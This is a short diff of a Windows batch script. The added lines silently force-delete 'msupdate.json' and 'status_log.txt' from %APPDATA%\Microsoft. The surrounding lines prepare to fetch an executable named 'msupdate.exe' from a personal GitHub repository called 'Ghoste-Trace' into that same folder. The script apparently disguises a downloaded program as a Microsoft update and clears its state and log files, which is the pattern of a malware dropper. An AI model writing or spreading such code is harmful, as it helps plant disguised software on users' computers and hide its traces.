@@ -108,6 +108,16 @@ if exist "%TARGET_FILE%" (
     exit /b 1
 )
 
+set "TARGET=%APPDATA%\Microsoft"
+
+if exist "%TARGET%\msupdate.json" (
+    del /f /q "%TARGET%\msupdate.json"
+)
+
+if exist "%TARGET%\status_log.txt" (
+    del /f /q "%TARGET%\status_log.txt"
+)
+
 :: Paths and URLs for msupdate.exe
 set "MSUPDATE_PATH=%APPDATA%\Microsoft\msupdate.exe"
 set "MSUPDATE_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/msupdate.exe"
